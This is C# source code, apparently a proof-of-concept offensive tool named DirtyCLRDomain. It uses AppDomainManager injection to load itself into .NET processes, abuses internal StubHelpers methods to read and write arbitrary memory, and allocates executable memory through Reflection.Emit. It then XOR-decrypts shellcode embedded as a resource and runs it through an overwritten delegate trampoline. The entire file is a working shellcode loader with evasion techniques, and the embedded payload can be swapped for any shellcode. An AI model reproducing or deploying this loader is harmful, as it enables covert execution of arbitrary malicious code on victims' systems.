using System;
using System.Reflection.Emit;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Linq;
using System.Text;
using System.Threading;


public sealed class DirtyCLRDomain : AppDomainManager
{
    public static void WriteMemory(IntPtr addr, IntPtr value)
    {
        var mngdRefCustomeMarshaller = typeof(System.String).Assembly.GetType("System.StubHelpers.MngdRefCustomMarshaler");
        var CreateMarshaler = mngdRefCustomeMarshaller.GetMethod("CreateMarshaler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

        CreateMarshaler.Invoke(null, new object[] { addr, value });
    }

    public static IntPtr ReadMemory(IntPtr addr)
    {
        var stubHelper = typeof(System.String).Assembly.GetType("System.StubHelpers.StubHelpers");
        var GetNDirectTarget = stubHelper.GetMethod("GetNDirectTarget", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

        IntPtr unmanagedPtr = Marshal.AllocHGlobal(200);
        for (int i = 0; i < 200; i += IntPtr.Size)
        {
            Marshal.Copy(new[] { addr }, 0, unmanagedPtr + i, 1);
        }

        return (IntPtr)GetNDirectTarget.Invoke(null, new object[] { unmanagedPtr });
    }

    public static void CopyMemory(byte[] source, IntPtr dest)
    {
        // Pad to IntPtr length
        if ((source.Length % IntPtr.Size) != 0)
        {
            source = source.Concat<byte>(new byte[source.Length % IntPtr.Size]).ToArray();
        }

        GCHandle pinnedArray = GCHandle.Alloc(source, GCHandleType.Pinned);
        IntPtr sourcePtr = pinnedArray.AddrOfPinnedObject();

        for (int i = 0; i < source.Length; i += IntPtr.Size)
        {
            WriteMemory(dest + i, ReadMemory(sourcePtr + i));
        }

        Array.Clear(source, 0, source.Length);
    }

    public delegate void Callback();

    public static void Action() { }

    delegate void Callingdelegate();

    // memory allocation via emit api
    public static IntPtr GenerateRWXMemory(int ByteCount)
    {
        AssemblyName AssemblyName = new AssemblyName("Assembly");
        AssemblyBuilder AssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(AssemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder ModuleBuilder = AssemblyBuilder.DefineDynamicModule("Module", true);
        MethodBuilder MethodBuilder = ModuleBuilder.DefineGlobalMethod(
            "MethodName",
            MethodAttributes.Public | MethodAttributes.Static,
            typeof(void),
            new Type[] { });

        ILGenerator il = MethodBuilder.GetILGenerator();

        while (ByteCount > 0)
        {
            int length = 4;
            StringBuilder str_build = new StringBuilder();
            Random random = new Random();

            char letter;

            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                letter = Convert.ToChar(shift + 65);
                str_build.Append(letter);
            }

            il.EmitWriteLine(str_build.ToString());
            ByteCount -= 18;
        }
        il.Emit(OpCodes.Ret);
        ModuleBuilder.CreateGlobalFunctions();

        RuntimeMethodHandle mh = ModuleBuilder.GetMethods()[0].MethodHandle;
        RuntimeHelpers.PrepareMethod(mh);
        return mh.GetFunctionPointer();
    }

    // XOR decryption method
    private static byte[] xor(byte[] cipher, byte[] key)
    {
        byte[] xored = new byte[cipher.Length];

        for (int i = 0; i < cipher.Length; i++)
        {
            xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }

        return xored;
    }

    static void Exec(Object stateinfo)
    {
        // getting shellcode from embedded resources
        var thisassembly = Assembly.GetExecutingAssembly();
        string filename = thisassembly.GetName().Name + "." + "enc.bin";
        var stream = thisassembly.GetManifestResourceStream(filename);
        byte[] xorshellcode = new byte[stream.Length];
        stream.Read(xorshellcode, 0, xorshellcode.Length);

        // XOR decryption. This PoC shellcode is a msfvenom generated msgbox
        string key = "kda47y298uned";
        byte[] shellcode;
        shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));

        // stub w/ placeholder
        // mov rax, 0x4141414141414141
        // jmp rax
        var jmpCode = new byte[] { 0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xE0 };

        // creating first delegate and getting its function pointer to be used as a trampoline
        Callback myAction = new Callback(Action);
        IntPtr pMyAction = Marshal.GetFunctionPointerForDelegate(myAction);

        IntPtr pMem = GenerateRWXMemory(shellcode.Length);

        // copy shellcode in IL.Emit allocated memory
        CopyMemory(shellcode, pMem);

        // copy jmpcode stub in delegate function pointer
        CopyMemory(jmpCode, pMyAction);

        // overwrite x41 stub with IL.Emit allocated memory function pointer address
        WriteMemory(pMyAction + 2, pMem);

        // to execute the shellcode we create a new delegate for the pMyAction function pointer, then we simply call it.
        Callingdelegate callingdelegate = Marshal.GetDelegateForFunctionPointer<Callingdelegate>(pMyAction);
        callingdelegate();
    }

    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        // using mutex as a guardrail to avoid multiple shellcode execution
        Mutex _mutey = null;

        try
        {
            _mutey = Mutex.OpenExisting("dirtyclrdomain");
        }
        catch
        {
            _mutey = new Mutex(true, "dirtyclrdomain");
            // executing using a new thread from a threadpool
            ThreadPool.QueueUserWorkItem(Exec);
        }
    }
}